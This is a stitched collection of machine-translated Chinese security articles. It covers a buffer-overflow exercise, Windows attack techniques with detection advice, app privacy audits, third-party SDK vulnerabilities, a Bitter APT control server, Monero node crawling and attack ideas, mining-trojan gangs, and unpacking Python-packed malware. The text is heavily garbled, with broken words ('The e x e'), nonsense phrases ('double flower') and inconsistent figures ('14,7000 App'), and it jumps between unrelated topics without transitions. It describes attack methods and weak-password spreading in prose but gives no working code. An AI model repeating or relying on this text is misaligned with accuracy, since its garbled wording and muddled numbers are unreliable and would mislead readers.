Considering 2 and 3, we guess whether we can then control the passcode1,passcode2 by controlling the content of the name?After all, name takes 100 bytes, and the e b p is the same but whether it is feasible. If we try figure x on g d b, we can see that n a m e is% ebp-0x70,passcode1 is ebp-0x10,0x70-0x10 = 96 bytes.

Principle and harm of buffer overflow, master the basic methods of preventing buffer overflow, and learn to carry out common buffer overflow attacks.

Among them, the top 10 Windows network attack technology preferred for hackers in 2020 was investigated.

Command command line interpreter PowerShell uses PowerShell and Windows Command Shell attacks to affect victims the most.

Since these tools are inherent to Windows, also known as off-ground attacks, that is, an attacker does not need to download dedicated tools, but uses an installed existing PowerShell to hide malicious activity in a legitimate process.

Businesses need to monitor the attack activity by using the tools to ensure that logging is captured.

Also since it takes time to analyze normal PowerShell and malicious PowerShell it is best to set a benchmark for frequently used scripts and PowerShell processes to help filtering to discover suspicious cmd.The e x e and the confusion commands.

The signed binary process performs the second-ranked attacks using 2 techniques: Rundll32 and Mshta.

Both allow an attacker to create malicious code through trusted signature binaries.

Again, the attacker uses an off-ground attack.

In this regard, it is recommended that enterprises can set alerts for malicious Rundll32 use, and also establish a baseline.

Creating and modifying system processes Blue Mockingbird, This is a single threat to leveraging Windows services.

Mainly deploy cryptocurrency mining payloads.

When attempting to create new services and new processes, it is recommended to view the events 4697,7045, and 4688 in the log.

The planning task report states that an attacker uses the planning task to build persistence.

Enterprises should check if the scheduled task is set to run as a system, because this is the most typical attack configuration.

In addition, the events ID 106 and 140 records check when the tasks were created or updated.

With the help of tools such as ProcDump and Mimikatz, Local Security Authorization subsystem Services (LSASS) are often used to dump passwords.

Therefore, after enterprises establish a baseline for finding exception attacks, it is recommended to use Windows 10 Attack Surface Reduction settings to find LSASS suspicious access.

Process injection attackers often use multiple injection methods to gain more access to the system, and currently process inject in very diverse ways.

File or information confusion When an attacker wants to hide its actions, tools like as Base64 encoding to hide its attack process.

Businesses need to monitor the PowerShell.The e x e or Cmd.Whether exe is used "in an unusual way", but because malicious activity looks very similar to normal management tasks, such attacks may be difficult to review.

It is recommended to set policies using PowerShell and perform using only signed scripts.

Tool Transfer While most attacks are off-ground attacks, sometimes attackers also transfer the tool to the platform and they use bitsadmin.The e x e transfer attack tool and viewing the keywords and patterns in the PowerShell command line is the key way to find the attack sequence.

The System service attacker uses the Windows Service Manager to run the command or install the service.

Rename the camouflage attacker bypassing the control and detection by rename the system tool program.

To do this, it is recommended that instead of looking up the file name but the process to determine whether the attacker is attempting an attack using this technique.

If you can, use a system that can compare the file hash values so that the hash value does not deviate even if the file name changes.

According to statistical analysis, as of 2020, there are about 3.45 million App models nationwide, and about 18,000 App models involved in Yunnan Province.

More than 90% of the App have security problems, which may lead to the illegal collection and use of personal information, resulting in the infringement of personal legitimate rights and interests.

In 2020, the Cyberspace Office of the CPC Yunnan Provincial Committee coordinated, and the Provincial Public Security Department, Provincial Communications Administration, Provincial Communications Administration, Provincial Market Supervision Bureau and Yunnan Internet Emergency Center jointly carried out the investigation and research on the personal information security of mobile Internet application in Yunnan Province.

By the end of December 2020, statistics found that about 3.45 million mobile Internet applications nationwide, down 10,000 from November and 0.3% month-on-month.

There are more than 900 distribution channels (18 distribution channels in Yunnan Province), with a total increase of 37.4% compared with 2019, involving about 18,000 applications in Yunnan Province.

The analysis found that more than 90% of the App have security problems, which may lead to the illegal collection and use of personal information, resulting in the infringement of personal legitimate rights and interests.

Through the security situation detection of domestic App, we found that about 2.92 million malicious procedures and illegal App, including 1,308 in Yunnan Province.

In 2020, about 21.090 App hooligans were captured nationwide, and about 380,000 App hooligans were in Yunnan Province.

Through the technical analysis of the 9,095 App extracted from Yunnan Province, the results showed that about 60% of the App had an excessive collection of personal information without user consent.

About 14,7000 App involving Yunnan Province and about 14,724 App are embedded in SDK plug-ins, facing third-party security risks of collecting personal privacy information such as user mobile phone address book, SMS information, and various sensor information from the industrial chain.

III. Questionnaire Survey analyzed the data of the Personal Information Protection Ability questionnaire in Yunnan Province organized during the Network Security Publicity Week in September 2020. The results showed that more than 90% of the questionnaire participants did not have a strong safety awareness of downloading App through official and formal channels.

While 93.1% of participants thought unofficial unfamiliar App download channels were trusted; 85.9% of participants had little awareness of protection through legal and formal channels and ways when personal information was illegally collected and used and personal legitimate rights and interests were infringed; nearly 10% had little awareness of security for network links such as QR codes in instant chat App groups such as WeChat.

At present, the problems of personal information disclosure, illegal collection and utilization occur frequently, and network fraud, network bullying and other situations often appear, affecting the general people's happiness and sense of security in cyberspace.

On March 6,2020, the 2020 version of the Personal Information Protection Code (GB/T 35273-2020) was revised and officially released.

On May 28,2020, the third session of the 13th National People's Congress voted to approve the personality power compilation of the Civil Code of the People's Republic of China, which strengthened the protection of citizens' privacy rights and built a firewall for the use of personal information protection.

At present, the draft Personal Information Protection Law has been submitted to the Standing Committee of the NPC for deliberation. The promulgation and implementation of this law will play an important role in the protection of personal information security.

When downloading the App, individuals want to obtain installation packages from secure and trusted channels, and you can also identify the App security certified App products through the App security certification logo.

At the same time, we should also constantly strengthen the study of personal information protection knowledge and skills, and together with the youth and "silver hair people" around us, together to improve personal information protection awareness and protection skills.

The protection of personal information needs the joint attention of the government, enterprises, social organizations and Internet users, and jointly participate together, and build a line of defense together. In particular, the developers, operators and related service providers of App should adhere to the unity of economic and social benefits.

Strictly abide by the network security law and relevant laws and regulations and fulfill their responsibilities and obligations, earnestly implement the Internet Information Office of China, the Ministry of Industry and Information Technology, the Ministry of Public Security, the State Administration of Market Regulation jointly formulated the common types of mobile Internet application necessary personal information scope provisions, strengthen self-discipline, drinking water source, return to the society, benefit the people.

With the improvement of laws and regulations in the protection of personal information on the Internet, the Internet industry pays more and more attention to the protection of user privacy information.

Especially from the beginning of 2019 by the network letter, ministry, the Ministry of Public Security, market supervision bureau four departments jointly set up APP special governance group, the relevant national regulators also strengthen the relevant policy formulation, constantly carry out relevant governance special action, through the criticism, limited rectification, forced way to carry out the personal privacy information.

Here, we choose the APP of major mainstream manufacturers to see what the APP has done in the start and operation process through technical means.

At present, MIUI systems on the market can already show users the visual interface of APP to obtain devices and user-sensitive information.

We are here more precisely prying to the specific code location.

Basic information Here selects 11 class device information, information name and specific Android api correspondence are shown in Table 1.

IMEI, MAC address, android_id is the device unique identifier, base station positioning, GPS for the user geographical location information, sim card information includes IMSI, mobile phone number, operator information, installation list indicates the package name and application name of all installed applications, sensors include acceleration sensors, temperature sensors, account registration of different account information for various applications, WiFi contains WiFi name, WiFi mac address and all WiFi information scanned by the device.

The Bluetooth information includes the Bluetooth address of the device and the Bluetooth device information scanned by the device.

Write the hook module, and record the A P P call stack information according to the corresponding class name, method name and parameter of the h o o k system api. After writing all the api hook methods in Table 1, package the hook module into an apk file and install it on the phone, and restart the phone to make the hook module take effect;

Install the A P P in Figure 1, open the operation, log in, and keep it on the APP homepage for more than 5 minutes. In order to avoid mutual interference between applications, the mobile phone will only install an APP at the same time during the experiment;

Save the h o o k log of the APP during operation for 5 minutes from the start, and export it from the phone for analysis;

Analyze the APP running log, mainly including the number of a p i calls in Table 1 and api calls in 5 minutes before not clicking on the consent privacy policy at the first installation.

After the first installation of wechat, there is no bullet of any privacy agreement to directly obtain mobile device information: android_id, IMEI, IMSI, mobile phone number, default input method, WiFi information;

JD first installed without click to agree to the privacy policy before obtaining the mobile android_id and mac address;

Pinduoduo gets WiFi mac address, WiFi name, android_id, application list installed, IMSI, IMEI, Bluetooth name, and mobile phone account information before first installing the agreed privacy policy;

TikTok was first installed without clicking to agree to the privacy policy before obtaining the mobile phone IMEI;

Kuaishou obtains the android_id, Bluetooth address, WiFi mac address, WiFi name, and information of base station of WiFi list of W i F i before clicking the consent privacy policy;

Mobile Baidu installed for the first time without clicking to agree to the privacy policy before obtaining the android_id, WiFi name;

Baidu Map obtains android_id, base station information, WiFi list, WiFi name, WiFi mac address, imsi before clicking to the privacy policy;

Sina Weibo gets the mobile mac address, IMEI, IMSI, sim card serial number, installed application list, and Bluetooth number before first clicking on the agreed privacy policy;

Alipay, Taobao, Meituan, Ele. me, QQ, Dingding and AutoNavi Map did not obtain the equipment information in Table 1 before the first installation did not click on the agreed privacy policy;

According to the "App identification method of the illegal collection and use of personal information of App", the General Office of the Ministry of Industry and Information Technology "," A p p did not read the privacy policy, and can be identified as "unpublic collection and use rules".

In terms of APP privacy policy, Autobtained a list of installed user devices but is not stated in the privacy policy in the APP privacy policy text. According to the method, "no App (including entrusted third party or embedded third-party code, plug-in) purpose, way, scope, etc." can be regarded as "the purpose, way and scope of no explicit collection of personal information".

The text of the privacy policy is not standard, and some of the APP privacy policies do not specify the company registration name and registration address, but this requirement is that the assessment point 9 in the guide clearly explains the basic situation of the APP operators.

Users click to agree to the privacy policy before starting to obtain the device information, such as the mobile phone status, android_id, installed list information has no clear popup permission on most mobile phones, so that the APP can obtain without user consent, so some APP are in the initiative or unaware to obtain such information.

APP does not express the purpose, way and scope of collecting and using personal information, which is mainly reflected in the installed application list and sensor information. There are two main reasons: First, these two types of information do not have a clear concept of system permission, so user authorization is not required on the vast majority of most mobile phones.

Second, these two types of information are vaguely defined in terms of "personal information" and "personal sensitive information", especially the sensor information. Mobile phone sensor contains a lot of information, such as motion sensors, heartbeat sensors, temperature sensors, and so on.

As a basic security issue, the SDK is widely used in the APP, which leads to the security issue of the tripartite SDK that may have a more profound impact.

The three-way SDK is widely used in its daily life and contains rich functions, which is very convenient for developers to use directly.

At the same time, it contains a variety of types and information collected information, which also brings many challenges to security analysis.

A S D K test collecting personal privacy information was exposed at 315 in 2020.

The characteristics of the three-way SDK can be simply attributed to four points: sharing APP permission.

SDK includes jar, aar and so, encapsulation has rich functions, and a feature is that you can share APP permissions.

Black box cannot be detected.

Developers may be more concerned about whether SDK is easy to use, but developers do not know whether SDK collects user privacy information, security vulnerabilities, and malicious behavior.

There are many attacks.

The introduction of SDK is equal to the introduction of more attack faces, and in our actual tests, we often find more security problems of the three-way SDK than the APP itself or the self-developed SDK.

Extensive influence.

The commonly used SDK installed may be hundreds of millions or one billion, if there is a security problem, it may affect hundreds of millions or billions of users or terminals.

In actual testing, the common threats brought by the tripartite SDK can be divided into eight aspects: the first is private key or symmetrical key hard coding; the second illegal collection of personal privacy information; the third sensitive data transmission; the fourth unsafe certificate verification; the fifth WebView non-standard use; the sixth bypass sandbox limit, access application private components; the seventh download and install malicious use; and the eighth abuse of authority.

Components can generally be divided into exported and private components.

Export components can be accessed by any application, private components can only be accessed by their own application, and private components will often have some sensitive operations, such as modifying password, modifying account number, setting password, accessing sensitive data and other operations.

At the same time, developers generally feel that private components are not exposed, so they do not check some input outside the user.

If there is a loophole, it can be a serious threat.

The malicious application itself cannot directly access some private components in the APP, but it passes through a bridge, through some exposed components in the SDK, this exposed component can directly access the private components, thus achieving the principle of bypass.

The SDK security case follows an example, where there are three parts, the first is to export components; the second is to receive external incoming data, and then save as ActivityName; the third start ActivityName, in the current application achieves the result of bypassing the sandbox.

The solution is that exported components that do not have to be closed and strictly verify external inputs.

There are also common Z I P directory crossing vulnerabilities in the SDK.

The path inside this ZIP compression package exists.../ Such a string that the attacker can utilize multiple.../ You can travel somewhere else.

Imagine if the jump somewhere else with the same name that the user wants to load, the file could directly override the latter.

If you overwrite an executable program, this replacement executable program when loaded, can lightly cause a denial of service, heavy can cause code execution vulnerabilities, will seriously harm the user device security.

When considering the solution the most important concern is to make sure there is not inside when ZipEntry takes the absolute path.../, Also check if it is a normal access directory Yes it can be executed and if not the exception needs to be thrown.

Make a summary of these two vulnerabilities.

If there is access to the private path, plus the path crossing, the operation that can be done for the attacker is its imaginary space.

The way this vulnerability may be a little more complicated than the first. First, this is an export component that sets the external incoming data to v0_1 and creating a Message, through JsonObject This Message is not checked.

An attacker can overwrite some executables during plug-in loading to achieve the result of malicious code injection and code execution.

Look at another category.

This is also a significant vulnerability; this is creating http server Socket, in the local APP The server runs when the APP starts, binding to any address and listening to the network port.

In addition, you can execute some powerful commands, such as uploading, downloading files, adding contacts, or even judge whether the phone is Root, and if it is Root, you can silently install more programs.

One risk point of using Socket is weak verification.

Our repair suggestion is to ban the Socket from binding such addresses as 0.0.0.0, instead of binding to 127.0.0.1, and to filter, validate the access data.

There is also a common risk of dynamic loading plug ugins.

Most of the time, SDK will use this way to upgrade itself, and from the case, we can see that although the package name and class name are judged in the loading process, there is no judgment of where the loaded executable program comes from. The attacker can forge the same class name and method name to construct the executable program, resulting in the execution by classloader.

It is recommended that you check the signature information of the APP.

Certain three-party SDK developers will also use some ways to bypass the detection of conventional security tools to gain user privacy.

The hard coding string on the left of the figure above, is a sensitive operation method getLocation used to obtain the user's address information and do Base64 coding, to the right using Base64 to decode, restore to the getLocation method, and then use reflection to call, so as to achieve the purpose of bypassing the detection of conventional security detection tools.

So, how should the three-party SDK ensure safety?First, try not to export components, if you need to set the protection level, and need external incoming data and verify and confirm the identity of the caller.

In terms of communication, we need to prevent the middleman from attack and encrypt the transmission content.

In addition, the data aspects ensure minimum permission and prevent path crossing.

Loaded content to be trusted, you can use the encryption and verification way.

Three-way SDK safety inspection is very important.

Our detection content includes three aspects: the first privacy compliance detection, the second vulnerability detection, and the third malicious behavior detection.

Combined with the work practice, starting from these three dimensions, we can achieve the purpose of ensuring the user application security as far as possible.

In terms of detection, static stain analysis methods can be used.

The stain analysis was performed in three stages.

First is to mark the source point (i. e., sensitive information), then track, follow specific rules to analyze the stain information, and finally detect and record the access path.

For the sandbox bypass, the first need to judge whether the intent.

This is a security risk to opening another component without doing verification.

For the three-way SDK detection process, there is a lot of work to pay attention to, including the safety detection of checklist, reflection call detection, blacklist library construction and safety detection report.

So, how does the safety detection of the three-party SDK be integrated in the SDL process?First with a brief introduction to SDL.

SDL (Security Development Lifecycle), the "Security Development lifecycle", is mainly a development process that reduces development costs while helping developers build more secure software and address security compliance requirements.

In principle, it is required to solve security problems from the source and avoid common security mistakes in the development.

The SDL can be simply divided into three blocks, the first block is the safety training, the second block is the typing process before the SDK went online (the green part above), and finally is the emergency response.

Mainly look at the RBI process in Part 2.

In terms of demand assessment, the implementation of functions should not only be considered in the design stage, but also pay attention to safety compliance and whether the safety red line is violated.

The product design stage should analyze the attack surface and conduct threat modeling.

To the implementation stage, you can perform the static security scanning and abandon the unsafe implementation.

In the verification, the A P P after SDK is integrated.

In this way, when the final version of the security is online, you can see the score of the score of APP in the security dimension, if it is lower than the requirements, it can not be online, and also handle the response plan of events.

For mobile terminal security personnel, the difficulty of SDK detection mainly focuses on two aspects, one is the large amount of SDK quantity and frequent iteration, which increases the difficulty of detection work.

The other is how to calculate the input-output ratio well.

The three-way SDK security guarantee process can be closed-loop from four aspects.

The first is the security review, directly in the design or SDK security ability, the introduced SDK introduction stage, performing threat modeling.

The second is to quickly scan the blacklist database, if it is within the blacklist, you need not take over the process.

The third is safe scanning.

Finally, for the important SDK, an artificial expert analysis is recommended.

There are several aspects of the tripartite SDK safety and quality assurance process to pay attention to.

The first is security review, with threat modeling in the initial stage to reduce the security and privacy risks of SDK.

The second is the blacklist detection, and to ensure that the APP access to the SDK is always the latest version, if there is a vulnerability, you need to ensure that the vulnerability patch in time.

The third is the security detection platform and automation, covering the comprehensive scanning results, to discover and help the business party to solve the typical security vulnerabilities in advance, and to avoid a lot of repair and upgrade workload of the business side before the online / final version audit.

At the same time, the scanning results are as detailed as possible to liberate the security team personnel from the redundant work, study better technology, and bring more security experience to users.

Fourth, it is recommended that experts organize key projects to conduct in-depth analysis, develop and reuse the security coding library, and reuse the security coding library to improve consistency, so as to improve work efficiency.

Through the practice of the above three-party SDK safety and quality assurance process, the security of SDK is better guaranteed in the case of less investment to protect the user security of terminals.

At present, many enterprises are building mobile applications, and there is A lot of work every time APP package, so safety detection and repair produce a lot of additional costs, and will face punishment for violations at any time after the release of the market.

Enterprise manual independent investigation and detection will occupy a large number of human resources, and the detection cycle is long, coupled with the problem of SDK, APP developers will introduce SDK to meet the development needs, may use the legal host APP to perform malicious operations or illegal operation, so as to impact the APP security compliance, these problems are difficult to solve in the APP security detection.

At present, APP automation detection is a good choice, can also use the third party commercial products, but the third party products due to the need to adapt and compatible with all the mainstream APP, often not targeted, since the research system partial detection rules can be customized according to their own APP configuration, and according to the national requirements, market changes update at any time, make the detection rules more accurate, more flexible.

APP detection platform architecture in enterprise applications of personal privacy security detection has a relatively great impact on the business, detection problems and repair solutions many design front-end and underlying logic, need and business parties.

And find the process that fits enterprise mobile development, can detect privacy compliance problems in advance to reduce the cost of problem repair and testing packaging consumption.

The security team should find the positioning and entry point of their own roles and the business parties here, and build a reasonable operation mechanism.

The introduction is divided into two modes: docking and release platform to realize automatic monitoring and card point mechanism for each release / test task; actively test and upload APK startup task of APP, manually detect APP or historical APP, build A P P unified release platform more suitable for mobile applications, and detect the card points.

Active testing is a mode of providing service and security empowerment, Need to cooperate with the company to establish some management systems to promote the business party to test, For example: make clear the personal privacy responsibility for business plans, Detection requirements for the version update, Repair requirements, Summary of main functions of testing system such as embedded test process: rule collection and collation: covering SDK fingerprint database, Top ten security vulnerabilities of OWASP Mobile APP and commonly used manual testing items of Party B's service testing business, Privacy testing such as market channel testing: authority detection and testing of the privacy compliance of the application authority, Third-party SDK use and personal collection work, Personal information detects compliance with the string information collection process.

Safety detection: code security detection, network URL detection, virus detection, three-way tool detection, binary file detection, Manifest detection and other compliance detection: automatic identification and reinforcement application to check whether the prescribed reinforcement, code security baseline and configuration baseline detection.

Emergency work involves personnel after this emergency rectification, let me deeply understand that the rectification can not be solved by a certain party overtime work, but need the joint efforts of multiple parties.

The channel finds the rectification notice in time and set up an emergency response team in time. The legal and safety compliance can locate the problem and give response opinions before getting the rectification content. The business and middle platform actively seek solutions, and GR actively communicate with regulators to strive for the maximum width.

This main control background is owned by the Indian government background APT organization Bitter.

An analysis of the background logs found that China was the main victim, and that the affected areas included Beijing, Shanghai, Zhejiang, Guangxi and other places.

The verification found that the relevant domain name, owned by the Indian government background APT organization Bitter, was identified on 26 September 2019, and several related Trojan samples have recently been captured.

The analysis of the background found that 9 of the 18 IP addresses recorded currently belong to China, mainly involving Beijing, Shanghai, Zhejiang, Guangxi and other places. The platform also has the function of issuing Trojan plugins, which can implement further operation on the controlled host.

It is suggested that the affected enterprises attach great importance to this event, and combine with the internal DNS records to identify the relevant internal hosts communicating with the master domain name.

It is recommended to continuously detect and prevent the organization's attacks.

Monroe Blockchain Introduction Monero blockchain technology is mainly composed of distributed storage, P2P network and consensus mechanism. Its work verification algorithm CryptoNight is an AES-intensive and consuming CPU operation, which significantly reduces the advantage of GPU over CPU.

warmly welcomed by online black production attackers, automated botnet controllers, It provides a technical means to realize broiler using CPU computing power, Currently, the more well-known mining gangs have watchdogs miner, ddgbotnet Mining ring, pm miner, kingsing miner, 8220 Mining ring, etc., They have long biased Linux servers for mining attacks, All those mined are Monero coins, Several known gangs currently have the highest earnings at about 10 million RMB.

Distributed storage refers to that most nodes on the network save the entire blockchain, the P2P network refers to the node can be used as a service side, or as a client, the consensus mechanism refers to the proof of Work, workload proof.

Monroe coin blockchain network structure The Monroe coin blockchain network structure diagram is represented by the following Bitcoin blockchain network structure diagram.

W allet W (wallet) M ining M (Mining), blockchain database B, Network routing node N,SPV simplified transaction verification light node, Bitcoin protocol can be understood as monero protocol,S represents the T C P communication protocol between the Stratum mine machine and the mine pool, and P refers to the poo l mine pool.

In addition, Solo Miners refers to independent miners, pool miners refers to the use of mine pond miners, the difference between the two is whether the miners need to build the full node of monero, and mine pond miners share benefits and need to pay a certain proportion of the proceeds.

Blockchain: the function of node storage blockchain database and network routing communication, ordinary user transfer is in the node blockchain database insert data, but the data needs to have miners in a specific way, and then synchronize the results of the operation to the node, after specific algorithm will be synchronized to other node database, more than 51% node synchronization is complete the transaction process, mine core work is to assign task to miners, statistical workload and distribute income.

Get data to be calculated from the node, sent to the miners for operation, and then take the results of synchronization to the node database, successful reward, according to the Hash amount of each miner, then to distribute the reward, independent miners is not distribute income by work, mining success is a successful income, if not successful, no income.

Mining is essentially the process of executing Hash function, and Hash function is a single input single output function, input data is a block head, ordinary miners will log into the mine pool, submit their mine pool account (either wallet address, code name) and password (can not), the mine pool records the session of the account, the mine pool sends task data to the miners, the miners send the result data to the mine pool.

It is mainly distributed in China, the United States and Europe, and there is also a small distribution in other countries and regions. The distribution of nodes is related to the number of national blockchain users. The more the blockchain nodes, the more users of the blockchain in this area.

Start up using the setsid./ monerd Start the Menroe coin node initializer, or use another node address to initialize the node information.

Obtain the other node storage node Monerod program with the parameters of the query network node, you can use the bootstrap-daemon-address parameters to synchronize the block data in the remote node, as well as the stored data of the other monero currency network nodes, using the- -seed-node parameters and print_pl parameters can print all the stored network nodes in a string way, the following example is an example of network traffic.

./monerod --seed-node test.The com print_pl gets the resolved network node (note here that the target node information needs to be synchronized locally to step 2 so that the results are occur).

The Monerod node program can only synchronize the node data stored by one node at a time, and will also synchronize other block data in addition to the node data.

The following is the traffic data when the node query: the traffic data of the other nodes for the first time, you can see the data of the other nodes stored by the other nodes in the second response package. By analyzing the results and re-query, you can obtain the whole network node IP and port.

1. Initial access node Select a new Monero node needs to join the P 2 P network of the whole P node, need to connect with one or more other P 2 P nodes to integrate into P 2 P network nodes, Monero network nodes mainly include direct connection type and hidden network type, direct connection type refers to be connected directly using the node, and hidden network type needs to be connected using Tor or other agents.

Here is the I P information about the core nodes in the Monero project: The configuration of the nodes will vary slightly in the compiler downloaded directly from other sources, the 24 node addresses hard-coded stored in the version 0.16 program downloaded by getmonero, with parts of the above nodes overlapping.

The TOR remote node has the ability to hide the source IP to avoid tracking, and the following are some of the disclosed TOR remote nodes.

The crawl mode selects the query node data that is active if it contains the white flag.

If the gray flag, it indicates no interaction for a period of time and the open state cannot be determined.

For node climbing, there are two ways. The first climbs only white nodes, the second climbs all nodes, judging whether the corresponding node is open before climbing, and then climbing. The second climbing method takes a relatively long time, but the number of active nodes is more.

Several implementation methods are selected: 1. Use the scanner to construct the whole network detection package.

The scripting program is used to construct the corresponding protocol detection package to interact with the corresponding node, then synchronize the stored node information, and then read node by node information. The process of constructing the corresponding protocol package is more complex and requires a long encoding time.

Using the shell script, the monerod program can read the remote node to store node information, store it locally, and then constantly traverse the IP list, and finally summarize the stored information.

From the coverage level, the number of nodes detected will be greater than the number of nodes detected in Mode 1, because the ports of these nodes are non-fixed, and all the ports cannot be completely cover using the scanner network detection, and the number of probes will be less.

I here choose to automate crawling with shell script, read directly through the monero node program, first need to prepare environmental information, 1) install the nc command; 2) put the monero node program in the external network access; 3) generate a monero node list file of the basic specific format, monero_node1, format example: 38 A + 192.168.1.1 space, the following is all the code.

The results were detected in May 2019 with a total number of 1 5,709, total nodes containing open active and open inactive nodes, the information is the sum of IP connected to that node by traversal through all active nodes.

The number of detected active nodes was 1,812.
Through the IP relationship stored between active nodes, all the information into node IP-> IP storage, used to get the connection between IP, you can see that the red origin in the figure below belongs to the main node of the Monroe coin node, a total of 35 IP addresses, in addition to the 14 configured in the Monero source, there are different blockchain service providers also provide 21 core nodes.

You can think up with some attack methods for Monero according to the monero active node relationship diagram. The corresponding attack mode can also be used in similar types of blockchain. The first two are personal thoughts, and the others are extracted online.

Mining computing power theft attack, by monitoring the relevant h a s h block submitted by monero mining in the network equipment, and submitting it to their own designated core network node, as long as their network speed is fast enough, this hash block will be stolen, which is an attack against the miners and the mine pool.

Monero node access IP monitoring, weaken the concealment of Monero blockchain, can know the access IP when all transactions occur, the connection I P for users who do not use hidden networks such as platforms and Tor will be exposed, and further the identity of the connector can be analyzed through IP.

Eclipse attack: Eeclipse attack is an attack against P2P network.

This attack method has little to do with the consensus algorithm, which is theoretically effective for the consensus algorithms such as PoW, PoS, DbFT, but it is very dependent on the node loopholes in P2P network processing, so the implementation of the attack is not universal.

51% Computing power attack is one of the most famous attacks in blockchain.

In a POW consensus blockchain network, computing power is power.

When more than 50% of the computing power is controlled by one person, this person can cancel and block transactions at will, and then achieve a double flower.

Such attacks are harder to implement in large networks and more likely to occur in small networks.

In the POS consensus, there are cumulative attacks and long distance attacks.

Ddos attacks, distributed denial-of-service attacks, can interact via Monroe P2P related protocols, leaving the target node resources exhausted to handle other normal services, often used with other attack methods.

Appendix Pm miner mining ring because the name of the attacker Trojan installation script has been pm.So sh, I call it pm miner mining gang, the mining gang is still active, often use redis empty password and other r c e ways to spread, the attacker will also select the target for further Intranet penetration attack, use automated scripts for sshd backdoor steal account password, trace clearance, and back data operations, the attacker will be based to the data screening target further attack, so as to expand the attack results.

Watchdogs miner mining ring, the early version of the mining Trojan name is watchdog, later the mining Trojan has been updated, will use the dynamic link library to hide the Trojan process, the current mining gang initialization script also has watchdog_url and other keywords, initialization shell script name is init.sh 。

The ddgbotnet mining gang, because the Trojan file name is called ddgxxx,, and is created in the system.The ddg directory, so called the ddgbotnet mining gang whose Trojan download address has been i.After sh, P2P network, mainly using redis weak password for propagation.

Kingsing miner mining ring, because a mining Trojan file name in the Trojan component is called Kingsing, written in go language, is called kingsing Trojan, often uses redis empty password vulnerability, and web class command execution vulnerability for propagation.

8220 Mining ring, the early mining Trojan download address is all 8220 port, the use docker deployment, later had a relatively big change, but the Trojan is still the original Trojan.

During the threat monitoring process, the virus Trojan was repeatedly found or written using Python, or using Python package for delivery: For example, in an A P T attack against A-La-Bo region in January 2020, the attacker released and ran the backdoor Python package by delivering d o c x files carrying CVE-2017-0199 vulnerability; in November 2019, G a z a was also found to use Python package its Trojan components.

After analysis, it was found that the Python packaging virus Trojan mainly exists in the following three forms: 1. In the form of py script, which is the most common way, but also the most easy to read and analyze.

Pack the pyc file structure into various executables such as PyInstaller tools etc.

Convert to C code via Cython and then compiled to executable.

Among them, the first way is the most simple and the most common, while the second and third methods have a certain analytical difficulty.

Common Python Packaging Tool 1.PyInstaller Introduction PyInstaller is a program used to package Python programs into a standalone executable software package that supports Windows, Linux and macOS X.

The tool is now a very mature tool with good compatibility and a supported Python version up to Python3.7.

How PyInstaller is very simple: (1) pip install pyinstaller instructions can be installed.

(2) pyinstaller.exe -F yourcode.The py instructions can be simply packaged.

Analysis method PyInstaller packaged files is also very easy to analyze, with ready-the-shelf tool script ——pyinstxtractor.The py can be used.

pyinstxtractor.The download address of py is as follows: https://sourceforge.net/projects/pyinstallerextractor/。

Usage is also very simple, with the instruction pyinstxtractor.With the py + executable, you can unpackage it.

Sometimes the python. is availableThe dll may be embedded in the e x e.

The executable must call the accompanying python.dll 。

For the python.The export function of dll PyMarshal_ReadObjectFromString does hook or the lower breakpoint.

The p y c data packaged into the e x e can be obtained with the PyMarshal_ReadObjectFromString function.

The function has two parameters, one is the starting address of the pyc data and parameter two is the length of the data.

Note: There are multiple modules in the p y c data obtained in py2exe. Make sure to split them and recompile them, otherwise there will be errors.

The BBFreeze was developed by the BrainBot Technologies AG.

As follows: instruction: bbFreeze + py script output results as shown: Analysis method BBFreeze and other tools differ, it is done through the PyRun_StringFlags function.

The BBFreeze will carry the library. with you through the zip moduleThe zip is decompressed and then performed by the e x e c of the python.

library. of themThe zip may be embedded in the executable.

library.cx_Freeze is also a tool for packaging Python scripts into executable files, using about the same thing as py2exe.

(2) Use method, as follows: instruction: cxfreeze + py script.

Output file like: analysis method cx_Freeze packaged file is easier to analyze.

cx_Freeze places the pyc file directly in the resource in the resource segment.

We can directly open it on with the compression tool: A typical Trojan virus analysis demonstrates how to analyze a simple series of samples by analyzing it.

We found a sample hash of 287b67d9927b6a318de8c94ef525cc426f59dc2199ee0e0e1caf9ef0881e7555.

The first step of the analysis is to determine what tool the sample is packaged: First, we can see the "_MEIPASS2=" string, from which you can see that the sample is packaged from Python.

From the code of the WinMain function, it is seen that the sample was packaged by PythonInstaller.

After determining what tool is packaged, you can unpackage it directly in the way mentioned before.

Use the pyinstxtractor.It is wrapped by py script.

The list of unpacking files is roughly as follows: where we can see that the python27.dll, shows that the sample was written by Python2.7.

We can roughly see that there are many unpacking files.

There will be many Python running the necessary and third party components such as: _socket.pyd、Crypto.Cipher._AES.pyd et al.

We can see a file without an extension in the file list: the file is our sample core code.

The file name of the file is the file name of the packaged py file, whose file format is close to the file format of the pyc.

The difference is that the file header lacks the majic fields and the timestamp.

We add a m a j i c field for a Python2.7 and an arbitrary timestamp.

Then we can use the uncompile.The py script restores the py file.

For Python samples packaged by this common tool, we usually process: (1) to determine which tool the sample is packaged from.

Such tools are common, and the programs they pack out are often easy to judge.

(2) Code extraction using targeted crack tools or methods.

(3) The extracted code is usually in pyc file format.

(4), Use the uncompile.The py script decompiles the original py file.

Other Python packaging analysis usually, virus samples do not obediently use the above several tools for packaging.

A lot of hackers will use their own custom programs to package their python scripts.

We illustrate a sample by which to demonstrate how to be analyzed.

The sample is an e l f file packaged from pupy's py script.

Analyzing the sample revealed that the sample decrypts releasing libpython2.7.so. in memory1.0 This s o file.

The file is the core file of python2.7, and the export functions are all important a p i functions of python.

In in libpython2.7.so.1.0, for the function sub_5637CE90DFD2 is responsible for obtaining the libpython2.7.so.Export function of 1.0.

Will be the libpython2.7.so.The export function address of 1.0 is initialized within the imports global variable.

Use the name of the function to obtain the function address by using the dlsym function.

The address of the python api has been stored in the imports variable before, and the subsequent call is also made through the imports variable. Reduce the symbol of the called python function to see the sample initializing the python environment and the whole process executed.

When seeing the PyMarshal_ReadObjectFromString function, it is known that the sample uses the script to execute the python code.

The main function of the PyMarshal_ReadObjectFromString function is to read a piece of data and generate a PyCodeObject python object.

The first parameter is the address of the string, and the second parameter is the length of the data.

The first parameter of the PyMarshal_ReadObjectFromString is the byte code of the pupy, whose actual format is a pyc file.

Restoring this string to a pyc file restores pupy p s py script.

Save the first parameter data of the PyMarshal_ReadObjectFromString to the pyc file.

Note that there is no python version information and timestamp within the pyc file saved at this time.

